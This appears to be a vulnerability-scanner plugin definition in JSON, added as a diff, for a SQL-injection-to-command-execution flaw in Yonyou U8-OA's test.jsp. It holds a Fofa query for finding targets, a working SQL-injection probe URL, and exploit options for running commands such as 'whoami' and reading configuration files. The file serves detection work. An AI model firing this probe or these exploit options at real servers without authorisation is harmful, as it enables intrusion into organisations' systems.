@@ -1,0 +1,82 @@
+{
+  "Name": "Yonyou U8-OA test.jsp RCE with SQLi",
+  "Description": "When the user can control the parameters in the command execution function, Yonyou U8-OA can inject malicious system commands into normal commands, causing command execution attacks.",
+  "Product": "用友U8-OA企业版",
+  "Homepage": "https://www.yonyou.com/",
+  "DisclosureDate": "2020-09-11",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "title=\"用友U8-OA企业版\" || (body=\"致远A6-m协同管理软件\" && body=\"logn_layout\")",
+  "Level": "3",
+  "Impact": "When the user can control the parameters in the command execution function, malicious system commands can be injected into normal commands, causing command execution attacks",
+  "Recommendation": "Upgrade ",
+  "References": [
+    "https://www.cnblogs.com/AtesetEnginner/p/12106741.html"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "AttackType",
+      "type": "select",
+      "value": "cmd,basedir,readfile"
+    },
+    {
+      "name": "filepath",
+      "type": "select",
+      "value": "d:/Program Files/UFIDA/U8-OA/tomcat/webapps/yyoa/WEB-INF/web.xml,d:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml",
+      "show": "AttackType=readfile"
+    },
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami",
+      "show": "AttackType=cmd"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%200x514151)"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "0x514151",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "QAQ",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["rce", "sqli"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["用友U8-OA企业版"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
